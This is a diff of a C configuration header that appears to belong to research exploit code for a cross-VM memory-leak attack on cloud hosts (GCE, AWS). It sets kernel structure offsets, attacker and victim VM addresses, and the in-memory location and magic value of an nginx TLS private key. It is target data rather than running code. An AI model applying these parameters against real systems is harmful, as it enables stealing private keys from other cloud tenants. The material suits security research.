@@ -48,28 +48,54 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 #elif MACHINE == GCE
 
+// ----------[Debian]----------
 #define G_INIT_NAME		"swapper/"
-#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
+#define G_TEXT_INIT_TASK	0x1a1aa40	// struct task_struct init_task (Debian)
+// #define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task (Ubuntu)
 
 // struct task_struct {
 #define G_TASK_TASKS		0x890	// struct list_head tasks
 #define G_TASK_MM		0x8e0	// struct mm_struct *mm
-#define G_TASK_PID		0x960	// pid_t pid, tgid
-#define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
-#define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
-#define G_TASK_SIBLING		0x990	// struct list_head sibling TODO THIS IS ONLY GUESS
-#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
-#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
+#define G_TASK_PID		0x970	// pid_t pid, tgid
+#define G_TASK_PARENT		0x988	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
+#define G_TASK_CHILDREN		0x990	// struct list_head children TODO THIS IS ONLY GUESS
+#define G_TASK_SIBLING		0x9a0	// struct list_head sibling TODO THIS IS ONLY GUESS
+#define G_TASK_PID_LINKS	0x9e0	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
+#define G_TASK_COMM		0xba0	// char comm[TASK_COMM_LEN]
 // };
 
 // struct mm_struct {
-#define G_MM_PGD		0x78	// pgd_t *pgd
-#define G_MM_HEAP		0x168	// unsigned long start_brk
+#define G_MM_PGD		0x48	// pgd_t *pgd
+#define G_MM_HEAP		0x118	// unsigned long start_brk
 // };
 
-#define NGINX_SSLKEY		0x8abcf // Debian  |||  Ubuntu 0x8b99f
+#define NGINX_SSLKEY		0x8abcf
 #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
 #define SSLKEY_MAGIC		0x00818102
+
+// // ----------[Ubuntu]----------
+// #define G_INIT_NAME		"swapper/"
+// #define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
+
+// // struct task_struct {
+// #define G_TASK_TASKS		0x890	// struct list_head tasks
+// #define G_TASK_MM		0x8e0	// struct mm_struct *mm
+// #define G_TASK_PID		0x960	// pid_t pid, tgid
+// #define G_TASK_PARENT		0x970	// struct task_struct *real_parent TODO THIS IS ONLY GUESS
+// #define G_TASK_CHILDREN		0x980	// struct list_head children TODO THIS IS ONLY GUESS
+// #define G_TASK_SIBLING		0x990	// struct list_head sibling TODO THIS IS ONLY GUESS
+// #define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
+// #define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
+// // };
+
+// // struct mm_struct {
+// #define G_MM_PGD		0x78	// pgd_t *pgd
+// #define G_MM_HEAP		0x168	// unsigned long start_brk
+// // };
+
+// #define NGINX_SSLKEY		0x8b99f
+// #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
+// #define SSLKEY_MAGIC		0x00818102
 
 #elif MACHINE == AWS
 
@@ -395,6 +421,22 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // #define OWN_TASK	0xffff93a173d86140
 // #define HCR3		0x72ecfa2000UL
 // #define VICTIM_TASK	0xffff934fc41ca040 // victim's nanny ||| 0xffff935f6acfe140 // gce-victim's VCPU-0
+
+// ---------[ rain-vm-gce2-attacker ]---------
+// #define BASE		0x6d61f6218UL
+// #define HOST_DIRECT_MAP 0xffff9d1400000000
+// #define OWN_VCPU	0xffff9d1cb21c2680
+// #define OWN_TASK	0xffff9d16480b00c0
+// #define HCR3		0x61d67d2000UL
+// #define VICTIM_TASK	0xffff9d205930c100
+// #define VICTIM_KVM	0xffffb2b1f6a69000
+// #define VICTIM_VCPU	0xffff9d1ad49b2600
+// #define EPTP		0x27760f000UL
+// #define GCR3		0xefbf8e000UL
+// #define GCR3_LE		0x1b9a15067UL
+// #define GTEXT		0xffffffffb7a00000
+
+
 
 #elif MACHINE == AWS
 
